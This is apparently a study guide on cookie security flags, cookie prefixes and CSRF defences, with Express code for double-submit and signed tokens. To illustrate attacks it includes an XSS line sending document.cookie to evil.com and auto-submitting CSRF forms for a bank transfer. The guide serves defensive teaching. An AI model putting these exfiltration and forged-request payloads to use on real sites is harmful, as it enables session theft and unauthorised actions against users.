# Cookies: SameSite, HttpOnly, Secure, and CSRF Defense

## The Idea

**In plain English:** Cookies are tiny notes a website stores in your browser to remember who you are (like staying logged in). CSRF (Cross-Site Request Forgery) is a trick where a malicious website secretly makes your browser send one of those notes to another website on your behalf, causing actions you never intended.

**Real-world analogy:** Imagine your office building uses a physical ID badge to open doors. You walk into a coffee shop next door, and the barista hands you a secretly pre-filled request form addressed to your office's IT department asking them to reset everyone's passwords. You absent-mindedly put it in the internal mail slot when you return — your badge automatically validates the request, even though you never meant to send it.

- The ID badge = the session cookie stored in your browser
- The coffee shop = the malicious third-party website (evil.com)
- Dropping the form in the mail slot = your browser automatically attaching the cookie to a request
- The IT department acting on the form = the server trusting the request because the cookie looks valid

---

## Table of Contents

- [Overview](#overview)
- [Cookie Fundamentals](#cookie-fundamentals)
- [Cookie Flags Reference](#cookie-flags-reference)
- [CSRF Attack Flow](#csrf-attack-flow)
- [SameSite as CSRF Mitigation](#samesite-as-csrf-mitigation)
- [SameSite=Lax Details and Edge Cases](#samesitelax-details-and-edge-cases)
- [Double-Submit Cookie Pattern](#double-submit-cookie-pattern)
- [CSRF Token Patterns](#csrf-token-patterns)
- [Cookie Prefixes](#cookie-prefixes)
- [Third-Party Cookies and Privacy Changes](#third-party-cookies-and-privacy-changes)
- [Common Pitfalls](#common-pitfalls)
- [Interview Questions](#interview-questions)
- [Key Takeaways](#key-takeaways)
- [Resources](#resources)

## Overview

Cookies are one of the most security-sensitive browser APIs. Three of the most important attack vectors that cookies are involved in are:

1. **Cross-Site Request Forgery (CSRF)**: an attacker tricks a logged-in user's browser into making requests to your API, silently riding the session cookie
2. **Cookie theft via XSS**: a cross-site script exfiltrates session cookies to an attacker-controlled server
3. **Protocol downgrade**: a man-in-the-middle strips TLS and reads cookies on an HTTP connection

The `HttpOnly`, `Secure`, and `SameSite` flags, along with cookie prefixes (`__Secure-`, `__Host-`), form a layered defense against these attacks. This document focuses on the mechanics of each flag and specifically on SameSite's role in CSRF defense.

## Cookie Fundamentals

```
Set-Cookie header syntax:
Set-Cookie: <name>=<value>[; <attribute>]*

Example:
Set-Cookie: sessionId=abc123; Path=/; Domain=example.com; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
```

```typescript
// Server-side cookie setting (Node.js/Express example)
import type { Response } from 'express';

function setSessionCookie(res: Response, sessionId: string): void {
  res.cookie('sessionId', sessionId, {
    httpOnly: true,          // No JS access
    secure: true,            // HTTPS only
    sameSite: 'lax',         // CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours in ms
    path: '/',
    domain: 'example.com',   // Accessible to subdomains
  });
}
```

### Cookie Scope

```
Domain attribute:
  Set-Cookie: id=1; Domain=example.com
  → Sent to: example.com, api.example.com, admin.example.com
  → NOT sent to: evil.com, example.org

  Set-Cookie: id=1  (no Domain attribute)
  → Sent to: ONLY the exact host that set it (e.g., api.example.com)
  → NOT sent to: www.example.com

Path attribute:
  Set-Cookie: id=1; Path=/api
  → Sent when URL path starts with /api
  → NOT sent for / or /dashboard

  Set-Cookie: id=1; Path=/
  → Sent for all paths (most common for session cookies)
```

## Cookie Flags Reference

### HttpOnly

```
HttpOnly prevents JavaScript from accessing the cookie via document.cookie.
The cookie is ONLY sent via HTTP requests (headers).

Without HttpOnly:
  document.cookie → "sessionId=abc123; theme=dark"  ← visible to JS
  XSS can do: fetch('https://evil.com/steal?c=' + document.cookie)

With HttpOnly:
  document.cookie → "theme=dark"  ← sessionId is NOT included
  XSS cannot exfiltrate the session cookie

Set-Cookie: sessionId=abc123; HttpOnly

Important: HttpOnly does NOT prevent CSRF. The cookie is still sent
automatically with cross-site requests. It only prevents JS-based theft.
```

### Secure

```
Secure requires HTTPS for the cookie to be sent.
Over HTTP connections, the browser does NOT include the cookie.

Set-Cookie: sessionId=abc123; Secure

Without Secure:
  HTTP request to http://example.com → sends sessionId in plain text
  Anyone on the network can read it

With Secure:
  HTTP request to http://example.com → sessionId NOT sent
  HTTPS request to https://example.com → sessionId sent (encrypted)

IMPORTANT: Secure does NOT prevent XSS theft (if HttpOnly is missing).
It only prevents network-level interception.
```

### SameSite

SameSite is the primary cookie-based CSRF defense. It controls whether cookies are sent on cross-site requests.

```
Values:
  SameSite=Strict  → Never sent on cross-site requests
  SameSite=Lax     → Sent on top-level navigations (link clicks, address bar)
                     NOT sent on sub-resource requests (AJAX, forms, images)
  SameSite=None    → Always sent (requires Secure flag)
  (no SameSite)    → Defaults to Lax in modern browsers (Chrome 80+)

"Same-site" definition:
  Same site = same eTLD+1 (effective top-level domain + 1 label)
  example.com and api.example.com → SAME SITE (both example.com eTLD+1)
  example.com and evil.com → CROSS SITE (different eTLD+1)
  example.com and example.org → CROSS SITE (different TLD)
  localhost and localhost → SAME SITE
```

### Expires vs Max-Age

```
Expires: specific date/time (absolute)
  Set-Cookie: id=1; Expires=Wed, 21 Oct 2025 07:28:00 GMT
  Problem: relies on client clock being correct

Max-Age: seconds from now (relative, preferred)
  Set-Cookie: id=1; Max-Age=86400
  Expires in 24 hours regardless of client clock

Session cookie (no Expires or Max-Age):
  Deleted when the browser session ends (tab/window closed)
  Note: browser session restore may keep "session" cookies
```

## CSRF Attack Flow

CSRF (Cross-Site Request Forgery) exploits the browser's automatic cookie behavior:

```
Normal request flow:
  User is logged into bank.com (session cookie: sessionId=abc123)
  User visits bank.com/dashboard
  Browser: GET /dashboard HTTP/1.1
           Host: bank.com
           Cookie: sessionId=abc123  ← sent automatically

CSRF attack flow:
  1. User is logged into bank.com
  2. Attacker lures user to evil.com
  3. evil.com serves a page with:
     <img src="https://bank.com/transfer?to=attacker&amount=10000">
     OR:
     <form method="POST" action="https://bank.com/transfer">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="10000">
     </form>
     <script>document.forms[0].submit()</script>
  4. Browser sends the request to bank.com
     POST /transfer HTTP/1.1
     Host: bank.com
     Cookie: sessionId=abc123  ← AUTOMATICALLY included!
     Content-Type: application/x-www-form-urlencoded
     to=attacker&amount=10000
  5. bank.com sees a valid session cookie → executes the transfer!

The attack works because:
  - The cookie was set without SameSite (or with SameSite=None)
  - bank.com relies solely on the session cookie for authentication
  - The browser always sends cookies matching the target origin
```

```
What makes a request "cross-site":
  The request's initiator origin differs from the request's destination origin.

  evil.com page → request to bank.com: CROSS SITE
  bank.com page → request to api.bank.com: SAME SITE (same eTLD+1)
  bank.com page → request to other-bank.com: CROSS SITE
```

## SameSite as CSRF Mitigation

```
SameSite=Strict:
  Cookie is NEVER sent on cross-site requests.
  Completely defeats CSRF.
  
  Side effect: Breaks external links to your site.
  Example: User clicks a link in their email → arrives at your site
           logged OUT, because the session cookie was not sent
           with the top-level navigation from the email client.

SameSite=Lax:
  Cookie IS sent on safe top-level navigations (GET via link/address bar).
  Cookie is NOT sent on cross-site POST/PUT/DELETE requests.
  Cookie is NOT sent on sub-resource requests from cross-site pages
  (AJAX, form submits to cross-site, images, iframes).

  Mitigates most CSRF:
  ✓ Cross-site form POST: cookie NOT sent
  ✓ Cross-site AJAX POST: cookie NOT sent
  ✗ Top-level GET navigation from evil.com: cookie IS sent (but GET is usually safe)

SameSite=None:
  Cookie always sent (even on cross-site requests).
  Required for: payment widgets, OAuth popups, cross-site iframes.
  MUST be combined with Secure flag.
  Set-Cookie: id=1; SameSite=None; Secure
```

### CSRF + SameSite Decision Matrix

```
Request type                        | Strict | Lax  | None
────────────────────────────────────────────────────────────
Top-level GET (link click)          | ✗ No   | ✓ Yes | ✓ Yes
Top-level GET (address bar)         | ✗ No   | ✓ Yes | ✓ Yes
Top-level POST (form submit)        | ✗ No   | ✗ No  | ✓ Yes
Cross-site fetch/XHR (GET or POST)  | ✗ No   | ✗ No  | ✓ Yes
Cross-site image src load           | ✗ No   | ✗ No  | ✓ Yes
Cross-site iframe                   | ✗ No   | ✗ No  | ✓ Yes
Same-site request (any method)      | ✓ Yes  | ✓ Yes | ✓ Yes
```

## SameSite=Lax Details and Edge Cases

### The 2-Minute Exception (Chrome)

Chrome introduced a temporary compatibility exception: cookies without a SameSite attribute behaved as `SameSite=None` for the first 2 minutes after being set (to support OAuth flows that redirect back to the originating site). This exception was later removed.

### Lax + POST: The Key Protection

```
CSRF attacks typically use POST because state-changing operations should be POST.

evil.com:
  <form method="POST" action="https://bank.com/transfer">
    <input type="hidden" name="to" value="attacker">
  </form>
  <script>document.forms[0].submit()</script>

With SameSite=Lax:
  - The POST originates from evil.com (cross-site)
  - SameSite=Lax does NOT send session cookies on cross-site POST
  - bank.com receives the POST without a session cookie
  - Transfer rejected: no valid session

With SameSite=Strict:
  - Same result for POST, AND
  - Even top-level GET navigations from external sites don't carry the cookie
```

### Lax and OAuth

```
OAuth redirect flow:
  1. User visits evil.com (or any other site)
  2. Clicks "Login with Google"
  3. Google redirects back to: https://your-app.com/callback?code=xyz
  
  With SameSite=Strict on the pre-auth session cookie:
    The redirect from Google is a cross-site top-level GET navigation
    → session cookie NOT sent
    → login state lost between step 1 and step 3
  
  With SameSite=Lax:
    Top-level GET navigation → session cookie IS sent ✓
    OAuth works correctly

This is why Lax is the recommended default for most session cookies,
and Strict is reserved for sensitive admin/banking scenarios.
```

## Double-Submit Cookie Pattern

The double-submit cookie pattern provides CSRF protection without server-side session state. It is useful for stateless APIs.

```
How it works:
  1. Server sets a random CSRF token as a cookie (NOT HttpOnly)
     Set-Cookie: csrfToken=abc123; SameSite=Strict; Secure
     
  2. JavaScript reads the cookie:
     const csrfToken = document.cookie
       .split('; ')
       .find(row => row.startsWith('csrfToken='))
       ?.split('=')[1];
     
  3. JavaScript sends the token in a request header:
     fetch('/api/transfer', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'X-CSRF-Token': csrfToken,  ← token in header
       },
       body: JSON.stringify({ to: 'alice', amount: 100 }),
     });
     
  4. Server verifies the header token matches the cookie value:
     const cookieToken = req.cookies.csrfToken;
     const headerToken = req.headers['x-csrf-token'];
     if (!cookieToken || cookieToken !== headerToken) {
       res.status(403).json({ error: 'CSRF validation failed' });
       return;
     }
     // Proceed with request

Why this defeats CSRF:
  - CSRF attacker cannot read cookies from bank.com (same-origin policy on JS)
  - The attacker can forge the cookie header (browser sends cookies automatically)
    BUT cannot forge the X-CSRF-Token header (requires reading the cookie value)
  - Therefore, a valid X-CSRF-Token can ONLY come from JavaScript on the legitimate origin
```

```typescript
// Server implementation (Express)
import crypto from 'crypto';
import cookieParser from 'cookie-parser';

app.use(cookieParser());

// Middleware: set CSRF token if not present
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      secure: true,
      sameSite: 'strict',
      // NOT httpOnly — JS must be able to read this
    });
  }
  next();
});

// Middleware: validate CSRF on mutating requests
function csrfProtection(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next(); // Safe methods don't need CSRF protection
  }
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'] as string;

  if (!cookieToken || !headerToken) {
    return res.status(403).json({ error: 'Missing CSRF token' });
  }

  // Use timingSafeEqual to prevent timing attacks
  if (!crypto.timingSafeEqual(
    Buffer.from(cookieToken, 'utf8'),
    Buffer.from(headerToken, 'utf8'),
  )) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

app.post('/api/transfer', csrfProtection, (req, res) => {
  // Safe to process
});
```

### Signed Double-Submit (Enhanced)

A weakness of the basic double-submit pattern: if an attacker can set cookies on your domain (via a subdomain takeover or other cookie injection), they can set their own csrfToken cookie and forge matching headers.

The signed double-submit pattern addresses this:

```typescript
// Sign the CSRF token with a server-side secret
import crypto from 'crypto';

const SECRET = process.env.CSRF_SECRET!;

function generateSignedToken(sessionId: string): string {
  const random = crypto.randomBytes(16).toString('hex');
  const hmac = crypto
    .createHmac('sha256', SECRET)
    .update(`${sessionId}.${random}`)
    .digest('hex');
  return `${random}.${hmac}`;
}

function verifySignedToken(sessionId: string, token: string): boolean {
  const [random, hmac] = token.split('.');
  if (!random || !hmac) return false;
  const expectedHmac = crypto
    .createHmac('sha256', SECRET)
    .update(`${sessionId}.${random}`)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(hmac, 'hex'),
    Buffer.from(expectedHmac, 'hex'),
  );
}

// Server sets:
// Set-Cookie: csrfToken=<random>.<hmac(sessionId+random)>
// Attacker forging a cookie cannot produce a valid HMAC without the secret
```

## CSRF Token Patterns

### Synchronizer Token Pattern (Server-Side State)

```
Traditional, stateful approach:
  1. On session creation, generate CSRF token, store in session
     session.csrfToken = crypto.randomBytes(32).toString('hex')
  
  2. Embed token in every HTML form:
     <input type="hidden" name="_csrf" value="{{ session.csrfToken }}">
  
  3. For SPA/AJAX: expose token via a meta tag or API endpoint:
     <meta name="csrf-token" content="{{ session.csrfToken }}">
     
     Or:
     GET /api/csrf-token → { token: 'abc123' }
  
  4. JavaScript reads token and adds to requests:
     const token = document.querySelector('meta[name="csrf-token"]')?.content;
     fetch('/api/action', {
       method: 'POST',
       headers: { 'X-CSRF-Token': token },
     });
  
  5. Server validates incoming token against session-stored token

Pros: Strong — token is bound to the server session
Cons: Requires session state; doesn't work with CDN-served static HTML
```

### Encryption-Based Token

```
CSRF-encrypted token (used by frameworks like Django):
  token = encrypt(sessionId + timestamp + random, serverSecret)
  
  Server decrypts token in header, verifies:
  - Contains the correct sessionId (links token to session)
  - Timestamp is within acceptable window (prevents replay)
  - Decryption succeeds (proves token came from server)

This is stateless (no server-side storage) but still session-bound.
```

## Cookie Prefixes

Cookie prefixes (`__Secure-` and `__Host-`) are enforced by the browser to prevent cookie injection attacks:

```
__Secure- prefix:
  Cookie MUST be:
  - Set via HTTPS
  - Have the Secure flag
  
  Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax
  
  Protection: prevents a compromised HTTP page on the same domain
  from overwriting the secure session cookie

__Host- prefix (stricter):
  Cookie MUST be:
  - Set via HTTPS
  - Have the Secure flag
  - No Domain attribute (binds strictly to the current host)
  - Path must be /
  
  Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
  
  Protection: prevents ANY subdomain from overwriting the cookie,
  because the cookie is bound to the exact host (not eTLD+1)
```

```typescript
// Best practice: __Host- prefix for session cookies
res.cookie('__Host-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict',
  path: '/',
  // NO domain attribute — required for __Host- prefix
});
```

## Third-Party Cookies and Privacy Changes

```
Third-party cookie: a cookie set by an origin that is NOT the top-level page's origin.
  User visits: shop.com
  shop.com loads: <script src="https://analytics.com/tracker.js">
  analytics.com sets: Set-Cookie: uid=xyz; SameSite=None; Secure
  → This is a third-party cookie (set by analytics.com on shop.com)

Browser changes (2024+):
  Chrome: gradually phasing out third-party cookies (Privacy Sandbox)
  Firefox: Total Cookie Protection (partitions cookies by top-level site)
  Safari: ITP (Intelligent Tracking Prevention) — 3P cookies blocked by default

Impact on SameSite=None:
  SameSite=None was designed for cross-site cookies (payment widgets, OAuth)
  As browsers restrict 3P cookies, SameSite=None cookies will stop working
  in third-party contexts regardless of the flag.

Alternatives:
  - First-party sets (set of related domains treated as same-party)
  - CHIPS (Cookies Having Independent Partitioned State)
    Set-Cookie: token=abc; SameSite=None; Secure; Partitioned
    → Cookie is partitioned per top-level site — analytics.com's cookie
      seen from shop.com is different from analytics.com's cookie seen from news.com
```

## Common Pitfalls

### Pitfall 1: HttpOnly is Not CSRF Protection

```
Many developers confuse HttpOnly with CSRF protection.

HttpOnly PREVENTS: JavaScript-based cookie theft (XSS exfiltration)
HttpOnly does NOT PREVENT: CSRF (the browser still sends the cookie automatically)

CSRF attack works even with HttpOnly because:
  - The browser sends cookies in HTTP headers automatically
  - The attacker doesn't need to READ the cookie value
  - The attacker just needs the browser to SEND the cookie

You need SameSite (and/or CSRF tokens) for CSRF protection.
HttpOnly alone is NOT sufficient.
```

### Pitfall 2: Relying on CORS for CSRF Protection

```
CORS is NOT CSRF protection.

CORS controls which JavaScript can READ responses from cross-origin requests.
Simple requests (form submits, <img> src, no custom headers) bypass CORS preflight.

A CSRF attack via a hidden form does NOT use fetch/XMLHttpRequest.
It uses a plain form submit. Form submits are "simple requests" that:
  - Bypass CORS (no preflight)
  - Carry cookies
  - Reach the server

The server has no way to distinguish a legitimate form submit from
a cross-site forged form submit based on CORS headers alone.

CORS + SameSite = proper defense
CORS alone = NOT CSRF protection
```

### Pitfall 3: SameSite=Lax and GET-Mutating Endpoints

```typescript
// BAD: State-changing operation on a GET endpoint
app.get('/api/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// With SameSite=Lax, GET requests from external links DO send the cookie.
// An attacker can CSRF-logout your users with:
// <img src="https://your-app.com/api/logout" />

// GOOD: State-changing operations MUST use POST/PUT/DELETE
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// SameSite=Lax does NOT send cookies on cross-site POST →
// CSRF logout via <form method="POST"> fails
```

### Pitfall 4: Cookie Domain Too Broad

```
BAD: Setting Domain=.example.com (note the leading dot — now deprecated but historically common)
  → Cookie sent to ALL subdomains: user.example.com, api.example.com, etc.
  → If any subdomain is compromised or allows XSS, it can access the cookie

GOOD: No Domain attribute (or specify the exact host)
  → Cookie only sent to the exact host that set it
  → Subdomain compromise does not affect the root domain's cookie

For multi-subdomain apps: consider __Host- prefix cookies
and per-subdomain tokens rather than a shared domain-wide cookie.
```

### Pitfall 5: Forgetting SameSite=None Requires Secure

```
Set-Cookie: tracking=xyz; SameSite=None

Modern browsers REJECT this — SameSite=None requires the Secure flag.
The cookie will be silently dropped by Chrome, Firefox, Safari.

Set-Cookie: tracking=xyz; SameSite=None; Secure  ← correct
```

## Interview Questions

### Question 1: Explain the CSRF attack and how SameSite prevents it.

**Answer**: CSRF exploits the browser's automatic cookie behavior. When a user is logged in to bank.com and visits evil.com, evil.com can include a hidden form or image that triggers a request to bank.com. The browser automatically attaches bank.com's session cookie to that request, making bank.com think it's a legitimate authenticated request. `SameSite=Lax` prevents this by telling the browser not to send the cookie on cross-site requests that are not top-level navigations. `SameSite=Strict` is even more conservative and never sends the cookie on cross-site requests. Without these flags, the browser sends the session cookie regardless of where the request originated.

### Question 2: What is the difference between HttpOnly and SameSite?

**Answer**: `HttpOnly` prevents JavaScript from accessing the cookie via `document.cookie`, protecting against XSS-based cookie theft. `SameSite` controls whether the browser sends the cookie on cross-site requests, protecting against CSRF. They address different threat vectors and are complementary. `HttpOnly` alone does not prevent CSRF because the browser still sends the cookie in request headers automatically — the attacker doesn't need to read the cookie value to forge a request. A session cookie should have both flags: `HttpOnly; SameSite=Lax` (or Strict) for defense in depth.

### Question 3: How does the double-submit cookie pattern work and what is its limitation?

**Answer**: The server sets a random token as a non-HttpOnly cookie. JavaScript reads this cookie value and adds it to request headers (`X-CSRF-Token`). The server verifies that the header value matches the cookie value. An attacker can force the browser to send the cookie (that's the whole CSRF attack), but cannot read the cookie's value from another origin (same-origin policy for JS) and therefore cannot forge the matching header. The limitation is cookie injection: if an attacker can set cookies on your domain (via a subdomain takeover), they can set their own CSRF token cookie and forge matching headers. The signed double-submit variant (HMAC of sessionId + random) closes this gap.

### Question 4: What is the difference between same-site and same-origin?

**Answer**: Same-origin requires matching protocol, hostname, AND port (https://api.example.com:443 vs https://example.com:443 are different origins). Same-site is more permissive — it compares the eTLD+1 (effective top-level domain plus one label). `api.example.com` and `www.example.com` are different origins but the same site (both share `example.com` as eTLD+1). SameSite cookie attributes use the same-site definition, so a cookie set by `api.example.com` is sent on requests initiated by `www.example.com` (same site). CORS uses same-origin, which is why SameSite and CORS protect at different granularities.

### Question 5: When would you use SameSite=None and what are its requirements?

**Answer**: `SameSite=None` is needed when your cookie must be sent in cross-site contexts — primarily for third-party embeds, payment widgets, OAuth flows that cross domain boundaries, analytics across sites, and cross-origin iframe interactions. The requirements are: the `Secure` flag must be present (browser rejects `SameSite=None` without `Secure`), and the cookie must be transmitted over HTTPS. With third-party cookie deprecation rolling out, `SameSite=None` cookies in third-party contexts will increasingly be blocked by browsers regardless of the flag — the CHIPS (Partitioned) attribute is the emerging replacement for legitimate third-party tracking use cases.

## Key Takeaways

1. **HttpOnly prevents XSS theft, not CSRF**: HttpOnly hides cookies from JavaScript; CSRF doesn't require reading the cookie — it just needs the browser to send it

2. **SameSite is the primary cookie-based CSRF defense**: `Lax` blocks cross-site state-changing requests (POST, etc.); `Strict` blocks all cross-site cookie sending including top-level navigations

3. **Default is now Lax in modern browsers**: Chrome 80+ defaults unset SameSite to `Lax` — but you should still set it explicitly for clarity and compatibility

4. **SameSite uses eTLD+1 (site), not origin**: `api.example.com` and `www.example.com` are same-site → cookies flow between them; CORS uses same-origin (stricter)

5. **Double-submit pattern for stateless CSRF protection**: non-HttpOnly random cookie + matching request header; attacker can send the cookie but cannot read it to forge the header

6. **`__Host-` prefix is the gold standard for session cookies**: forces Secure + no-Domain + Path=/ — cookie is strictly bound to the exact host

7. **CORS is not CSRF protection**: form submits bypass CORS; CORS only controls which JS can read responses

8. **SameSite=None requires Secure**: browser silently drops `SameSite=None` cookies without the `Secure` flag

## Resources

- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [RFC 6265bis (Cookie updates, SameSite)](https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html)
- [web.dev: SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)
- [CHIPS: Partitioned cookies](https://developers.google.com/privacy-sandbox/cookies/chips)
- ["Incrementally Better Cookies" (Chrome blog)](https://blog.chromium.org/2019/10/developers-get-ready-for-new.html)
- [Cookie prefixes explainer](https://googlechrome.github.io/samples/cookie-prefixes/)
- [PortSwigger: CSRF labs](https://portswigger.net/web-security/csrf)
